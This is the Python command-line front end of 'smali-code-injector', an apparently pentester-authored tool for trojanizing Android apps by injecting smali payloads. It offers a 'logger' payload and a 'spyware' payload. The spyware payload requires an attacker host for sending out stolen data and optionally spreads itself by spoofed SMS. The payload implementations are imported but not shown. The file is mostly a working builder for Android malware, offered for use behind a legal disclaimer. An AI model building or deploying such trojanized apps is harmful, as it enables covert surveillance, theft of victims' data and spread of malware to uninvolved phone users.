#!/usr/bin/env python
#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import argparse
import json
import logging
import logging.config
import os
import shutil
import sys

from payloads.logger import Logger
from payloads.spyware import Spyware
from reverse_engineer import reverse_engineer
from utils import config

# Implemented payloads
payloads = [
    "logger",
    "spyware"
]


def banner():
    banner = """
                   .d8888b.   .d8888b. 8888888
                  d88P  Y88b d88P  Y88b  888
                  Y88b.      888    888  888
                   "Y888b.   888         888
                      "Y88b. 888         888
                        "888 888    888  888
                  Y88b  d88P Y88b  d88P  888
                   "Y8888P"   "Y8888P" 8888888 
    """
    print("{}".format(banner))


def copyright():
    copyright = """
        =[ smali-code-injector v1.2-dev              |
+ -- ---=[ Alexandre Teyar @Ares                     |
+ -- ---=[ Penetration tester at Ambersail Ltd.      |
+ -- ---=[ GitHub:   github.com/AresS31              |
        =[ LinkedIn: linkedin.com/in/alexandre-teyar |

Disclamer: Usage of SCI for attacking targets without prior mutual consent 
           is illegal. It is the end user's responsibility to obey all 
           applicable local, state and federal laws.
           Developers assume no liability and are not responsible for any 
           misuse or damage caused by this program.
    """
    print("{}".format(copyright))


def parse_args():
    """
    Parse and validate user command line.
    """
    parser = argparse.ArgumentParser(
        description="Android assembly code (smali) injector"
    )

    parser.add_argument(
        "-a",
        "--app",
        dest="app",
        help="Android application to trojanize",
        required=True,
        type=argparse.FileType('r')
    )

    subparsers = parser.add_subparsers(
        dest="payload, search",
        help="available commands"
    )

    subparsers.required = True

    # Parser for the "search" command
    parser_search = subparsers.add_parser(
        "search",
        help="search command - identifies the main activity"
    )

    parser_search.set_defaults(command='search')

    # Parser for the "payload" command
    parser_payload = subparsers.add_parser(
        "payload",
        help="payload command"
    )

    parser_payload.set_defaults(command='payload')

    parser_payload.add_argument(
        "-d",
        "--dest",
        dest="destination",
        help="the destination file or directoy for injection filtering",
        default='',
        required=False,
        type=str
    )

    parser_payload.add_argument(
        "-k",
        "--keywords",
        dest="keywords",
        help="keywords (separated by ',') for injection filtering",
        default="-1",
        required=False,
        type=str
    )

    parser_payloads = parser_payload.add_subparsers(
        dest=", ".join(payloads),
        help="available commands"
    )

    parser_payloads.required = True

    # Parser for the "payload->logger" command
    parser_payload_logger = parser_payloads.add_parser(
        "logger",
        help="logger command"
    )

    parser_payload_logger.set_defaults(payload_name='logger')

    # Parser for the "payload->logger" command
    parser_payload_spyware = parser_payloads.add_parser(
        "spyware",
        help="spyware command",
    )

    parser_payload_spyware.add_argument(
        "-ppg",
        "--propagate",
        dest="propagate",
        help="spoofed SMS to send for the malware propagation",
        required=False,
        type=str
    )

    parser_payload_spyware.add_argument(
        "-rh",
        "--rhost",
        dest="rhost",
        help="attacker's host/ip for stolen data transmission",
        required=True,
        type=str
    )

    parser_payload_spyware.set_defaults(payload_name='spyware')

    return parser.parse_args()


def main():
    try:
        banner()
        copyright()

        args = parse_args()

        # Configure the logging module
        with open(config.LOGGING_CONF, 'r') as conf:
            logging.config.dictConfig(json.load(conf))

        if (args.command == "search"):
            logger.info("identifying the main activity...")
            main_activity = reverse_engineer.get_main_activity(args.app.name)
            logger.success("{}".format(main_activity))

        elif (args.command == "payload"):
            if(args.payload_name == "spyware"):
                payload = Spyware(args)
            elif (args.payload_name == "logger"):
                payload = Logger(args)

            payload.run()

    except KeyboardInterrupt:
        logging.error("CTRL+C pressed, exiting...")

        if os.path.exists(config.TMP_FOLDER):
            shutil.rmtree(config.TMP_FOLDER, ignore_errors=True)

        sys.exit(1)


if __name__ == "__main__":
    main()
